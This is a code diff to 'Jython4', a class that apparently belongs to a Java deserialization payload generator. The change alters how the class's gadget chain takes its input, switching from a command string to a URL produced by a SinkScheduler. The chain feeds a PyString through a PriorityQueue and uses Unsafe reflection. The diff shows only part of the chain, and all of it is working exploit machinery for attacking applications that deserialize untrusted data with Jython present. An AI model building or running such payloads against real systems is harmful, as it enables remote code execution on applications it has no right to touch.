@@ -5,6 +5,7 @@ import com.ppp.ObjectPayload;
 import com.ppp.annotation.Authors;
 import com.ppp.annotation.Dependencies;
 import com.ppp.secmgr.PayloadRunner;
+import com.ppp.sinks.SinkScheduler;
 import com.ppp.sinks.SinksHelper;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
@@ -40,14 +41,14 @@ public class Jython4 implements ObjectPayload<Object> {
 
     public Object getObject(SinksHelper sinksHelper) throws Exception {
         // sink
-        String command = sinksHelper.getCommand();
+        String url = (String) SinkScheduler.builder(sinksHelper);
 
-        Object kickOffObject = getChain(command);
+        Object kickOffObject = getChain(url);
 
         return kickOffObject;
     }
 
-    public Object getChain(String command) throws Exception {
+    public Object getChain(String url) throws Exception {
         String s = RanDomUtils.generateRandomString(1);
 
         Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
@@ -66,7 +67,7 @@ public class Jython4 implements ObjectPayload<Object> {
         PriorityQueue priorityQueue = new PriorityQueue(2, c);
 
         Object[] queue = new Object[]{
-                new PyString(command),
+                new PyString(url),
                 s
         };
 
